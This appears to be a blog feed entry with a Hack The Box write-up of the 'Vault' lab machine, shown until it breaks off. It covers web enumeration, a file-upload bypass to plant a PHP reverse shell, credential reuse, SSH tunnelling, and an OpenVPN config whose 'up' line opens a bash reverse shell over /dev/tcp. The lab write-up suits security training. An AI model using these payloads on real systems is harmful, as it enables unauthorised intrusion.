<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-04-06T16:22:47+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Vault</title><link href="http://localhost:4000/hack-the-box/vault/" rel="alternate" type="text/html" title="Hack The Box - Vault" /><published>2019-04-06T00:00:00+02:00</published><updated>2019-04-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/vault</id><content type="html" xml:base="http://localhost:4000/hack-the-box/vault/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-vault-retired-and-here-is-my-write-up-about-it-vault-was-a-fun-box-and-its-absolutely-one-of-my-favorites-starting-with-an-insecure-file-upload-functionality-to-escaping-from-a-host-to-another-and-getting-a-reverse-shell-with-an-openvpn-config--every-step-was-very-nice-its-rated-as-medium--its-a-linux-box-and-its-ip-is-101010109-i-added-it-to-etchosts-as-vaulthtb-lets-jump-right-in-&quot;&gt;Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an &lt;code class=&quot;highlighter-rouge&quot;&gt;openvpn&lt;/code&gt; config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.109&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;vault.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC vault.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-two-ports-are-open--80-running-http-and-22-running-ssh-as-always-we-will-check-http&quot;&gt;Only two ports are open : 80 running http and 22 running ssh. As always we will check http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;the-main-page-is-just-displaying-this-message-&quot;&gt;The main page is just displaying this message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction)	

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-gobuster-but-didnt-get-anything--so-i-looked-at-the-message-again-and-noticed-this-line--we-are-proud-to-announce-our-first-client-sparklays-sparklayscom-still-under-construction-so-i-went-to-sparklays-and-got-a-403-response&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but didn’t get anything , so I looked at the message again and noticed this line : &lt;code class=&quot;highlighter-rouge&quot;&gt;We are proud to announce our first client: Sparklays (Sparklays.com still under construction)&lt;/code&gt;. So I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/sparklays&lt;/code&gt; and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; response.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-now-we-know-that-this-directory-exists-and-we-can-enumerate-the-sub-directories-of-it--so-i-ran-gobuster-again-and-got-these-results-&quot;&gt;So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://vault.htb/sparklays/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/05 14:55:32 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin.php (Status: 200)
/design (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;adminphp-sounds-interesting-but-in-fact-its-useless&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin.php&lt;/code&gt; sounds interesting. But in fact it’s useless.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin.php&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/vault/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-for-authentication--i-tried-testtest-and-got-nothing-it-didnt-print-anything-&quot;&gt;It asks for authentication , I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;test:test&lt;/code&gt; and got nothing. It didn’t print anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-also-noticed-that-its-sending-the-login-data-through-get-parameters-which-is-rarely-used-also-checked-the-source-of-the-page-and-there-was-nothing-important-so-most-likely-this-is-just-a-rabbit-hole-and-trying-to-bypass-this-login-is-a-waste-of-time&quot;&gt;And I also noticed that it’s sending the login data through &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/design&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/vault/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;design-gave-us-a-403-response--i-ran-gobuster-one-more-time-and-got-these-results-&quot;&gt;Design gave us a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; response , I ran gobuster one more time and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://vault.htb/sparklays/design/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/05 15:03:20 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/uploads (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-checked-uploads-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploads&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-was-also-forbidden-but-since-there-is-a-directory-for-uploads-then-there-might-be-a-page-for-uploading-files-lying-around-somewhere-i-ran-gobuster-again-and-added-the-extensions-php-and-html-and-got-a-new-result--designhtml&quot;&gt;And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; and got a new result : &lt;code class=&quot;highlighter-rouge&quot;&gt;design.html&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/design.html&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/vault/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-a-link-titled-change-logo-which-takes-us-to-this-upload-page-&quot;&gt;There’s a link titled &lt;code class=&quot;highlighter-rouge&quot;&gt;Change Logo&lt;/code&gt; which takes us to this upload page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-restricted-file-upload&quot;&gt;Bypassing Restricted File Upload&lt;/h3&gt;
&lt;h4 id=&quot;i-created-a-small-php-script-to-get-a-reverse-shell-&quot;&gt;I created a small &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to get a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-named-it-shellphp&quot;&gt;And named it &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;tried-to-upload-and-as-expected--it-told-us-that-this-file-type-is-not-allowed-&quot;&gt;Tried to upload and as expected , it told us that this file type is not allowed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-know-what-are-the-allowed-file-types--we-will-use-zaps-fuzzer-and-a-file-extenstions-wordlist-i-got-from-seclists&quot;&gt;We need to know what are the allowed file types , We will use Zap’s fuzzer and a &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt&quot;&gt;file extenstions wordlist&lt;/a&gt; I got from seclists.&lt;/h4&gt;
&lt;h4 id=&quot;intercept-the-request--right-click--attack--fuzzer&quot;&gt;Intercept the request –&amp;gt; right click –&amp;gt; attack –&amp;gt; Fuzzer&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-filtering-the-response-body-size-we-will-notice-that-all-the-responses-are-519-bytes-except-the-response-of-php5-which-is-526-bytes-so-it-allows-files-with-extension-php5-to-be-uploaded&quot;&gt;By filtering the response body size we will notice that all the responses are &lt;code class=&quot;highlighter-rouge&quot;&gt;519&lt;/code&gt; bytes except the response of &lt;code class=&quot;highlighter-rouge&quot;&gt;.php5&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;526&lt;/code&gt; bytes. So it allows files with extension &lt;code class=&quot;highlighter-rouge&quot;&gt;.php5&lt;/code&gt; to be uploaded.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;since-the-request-has-already-been-sent-then-the-php-shell-is-on-the-server-now--lets-excute-it-&quot;&gt;Since the request has already been sent then the php shell is on the server now , Let’s excute it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-two-users-on-the-box-alex-and-dave--user-flag-is-not-on-the-box-on-the-desktop-of-dave-there-is-a-file-called-ssh-which-has-ssh-credentials-&quot;&gt;There are two users on the box &lt;code class=&quot;highlighter-rouge&quot;&gt;alex&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; , user flag is not on the box. On the desktop of &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; which has ssh credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-get-an-ssh-connection-as-dave-instead-of-this-reverse-shell-as-www-data-dave--dav3therav3123-&quot;&gt;Now we can get an ssh connection as &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; instead of this reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;dave : Dav3therav3123&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;escaping-from-ubuntu-to-dns--openvpn-reverse-shell--getting-user&quot;&gt;Escaping from &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;openvpn&lt;/code&gt; reverse shell , Getting user&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-rest-of-the-files-on-daves-desktop-&quot;&gt;Let’s take a look at the rest of the files on dave’s desktop :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;no-idea-what-to-do-with-that-key-itscominghome-so-we-will-leave-it-for-now-the-other-file-is-servers-&quot;&gt;No idea what to do with that key &lt;code class=&quot;highlighter-rouge&quot;&gt;itscominghome&lt;/code&gt; so we will leave it for now. The other file is &lt;code class=&quot;highlighter-rouge&quot;&gt;Servers&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-another-ip-now--1921681225--we-need-to-scan-it-but-unfortunately-nmap-is-not-on-the-box-&quot;&gt;We have another ip now : &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.122.5&lt;/code&gt; , We need to scan it but unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; is not on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;alternatively-we-will-use-nc-to-scan-the-first-100-ports-like-this--nc--zv-1921681225-1-100&quot;&gt;Alternatively we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to scan the first 100 ports like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -zv 192.168.122.5 1-100&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;port-80-is-open-and-running-http-&quot;&gt;Port 80 is open and running http :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-22-is-open-and-running-ssh-&quot;&gt;Port 22 is open and running ssh :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-take-a-look-at-http--but-we-cant-access-that-host-directly--so-we-will-set-up-an-ssh-tunnel-to-redirect-port-80-to-our-local-machine-&quot;&gt;We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L 1234:192.168.122.4:80 dave@vault.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-go-to-httplocalhost1234-and-access-that-http-service-&quot;&gt;Now we can go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://localhost:1234&lt;/code&gt; and access that http service :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;dns-configurator-gives-us-a-404-response-&quot;&gt;DNS configurator gives us a &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;vpn-configurator-allows-us-to-create-an-ovpn-file-and-execute-it-&quot;&gt;Vpn configurator allows us to create an &lt;code class=&quot;highlighter-rouge&quot;&gt;ovpn&lt;/code&gt; file and execute it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-this-point-i-stopped-and-searched-on-that-topic--because-i-didnt-know-how-to-get-a-reverse-shell-from-an-ovpn-file--and-this-article-really-helped&quot;&gt;At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an &lt;code class=&quot;highlighter-rouge&quot;&gt;ovpn&lt;/code&gt; file , and &lt;a href=&quot;https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da&quot;&gt;this article&lt;/a&gt; really helped.&lt;/h4&gt;
&lt;h4 id=&quot;we-are-going-to-listen-on-the-first-host-ubuntu-and-use-the-ovpn-configurator-to-get-a-reverse-shell-on-the-second-host-dns--we-need-to-know-the-ip-address-of-ubuntu-on-that-subnet--ifconfig-&quot;&gt;We are going to listen on the first host (&lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;) and use the &lt;code class=&quot;highlighter-rouge&quot;&gt;ovpn&lt;/code&gt; configurator to get a reverse shell on the second host (&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;) , We need to know the ip address of &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; on that subnet , &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ip--1921681221&quot;&gt;ip : &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.122.1&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;reverse-shell-payload-&quot;&gt;Reverse shell payload :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;remote 192.168.122.1
dev tun
nobind
script-security 2 
up &quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9898 0&amp;gt;&amp;amp;1'&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-nobind-because-as-you-can-see-theres-a-note-saying-that-nobind-must-be-used-lets-update-the-file-and-click-on-test-vpn-then-check-our-listener-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nobind&lt;/code&gt; because as you can see there’s a note saying that &lt;code class=&quot;highlighter-rouge&quot;&gt;nobind&lt;/code&gt; must be used. Let’s update the file and click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Test VPN&lt;/code&gt; then check our listener :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-on-dns&quot;&gt;SSH on DNS&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-dave-on-dns-theres-a-file-called-ssh-which-has-ssh-credentials-&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; there’s a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; which has ssh credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-close-that-reverse-shell-and-get-an-ssh-connection-on-dns-as-dave-dave--dav3gerous567&quot;&gt;So we can close that reverse shell and get an ssh connection on &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;dave : dav3gerous567&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-we-had-root-on-dns--now-we-are-dave-we-want-to-get-root-again-sudo--l-tells-us-that-dave-can-use-sudo-on-any-command-&quot;&gt;But we had &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; , now we are &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt;. We want to get root again. &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; tells us that &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; can use sudo on any command :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-easily-get-root-again-by-sudo-su-&quot;&gt;So we can easily get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; again by &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;authlog-enumeration&quot;&gt;Auth.log Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-servers-file-again--which-was-on-ubuntu&quot;&gt;By looking at &lt;code class=&quot;highlighter-rouge&quot;&gt;Servers&lt;/code&gt; file again , which was on &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-that-theres-a-host-called-the-vault-and-its-ip-is-not-there--so-probably-we-need-to-get-to-that-host--but-we-need-its-ip-first&quot;&gt;We notice that there’s a host called &lt;code class=&quot;highlighter-rouge&quot;&gt;The Vault&lt;/code&gt; and its ip is not there , so probably we need to get to that host , but we need its ip first.&lt;/h4&gt;
&lt;h4 id=&quot;after-a-lot-of-enumeration-i-looked-into-authlog-and-noticed-that-on-the-2nd-of-september-at-151020-and-151034-these-commands-were-executed-&quot;&gt;After a lot of enumeration I looked into &lt;code class=&quot;highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; and noticed that on the 2nd of September at &lt;code class=&quot;highlighter-rouge&quot;&gt;15:10:20&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;15:10:34&lt;/code&gt; these commands were executed :&lt;/h4&gt;
&lt;h4 id=&quot;part-of-the-log-&quot;&gt;Part of the log :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sep  2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by
dave(uid=0)
Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;commands-&quot;&gt;Commands :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-an-ip-19216852-and-we-suspect-that-its-the-one-we-are-looking-for-i-was-using-less-to-view-the-log-so-i-searched-for-the-ip-to-see-if-it-was-mentioned-anywhere-else-19216852--and-i-found-it-here-too-&quot;&gt;We have an ip (&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.5.2&lt;/code&gt;) and we suspect that its the one we are looking for. I was using &lt;code class=&quot;highlighter-rouge&quot;&gt;less&lt;/code&gt; to view the log so I searched for the ip to see if it was mentioned anywhere else &lt;code class=&quot;highlighter-rouge&quot;&gt;:?192.168.5.2&lt;/code&gt; , And I found it here too :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;command-&quot;&gt;Command :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-the-same-day-at-150751-that-ip-was-scanned-with-nmap--and-we-notice---source-port4444--whats-that-&quot;&gt;On the same day at &lt;code class=&quot;highlighter-rouge&quot;&gt;15:07:51&lt;/code&gt; That ip was scanned with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; , and we notice &lt;code class=&quot;highlighter-rouge&quot;&gt;--source-port=4444&lt;/code&gt; , what’s that ?&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;source-port--escaping-from-dns-to-vault&quot;&gt;Source Port , Escaping from &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-that-nmap-command-and-run-it-again-to-see-the-results-&quot;&gt;Let’s take that nmap command and run it again to see the results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
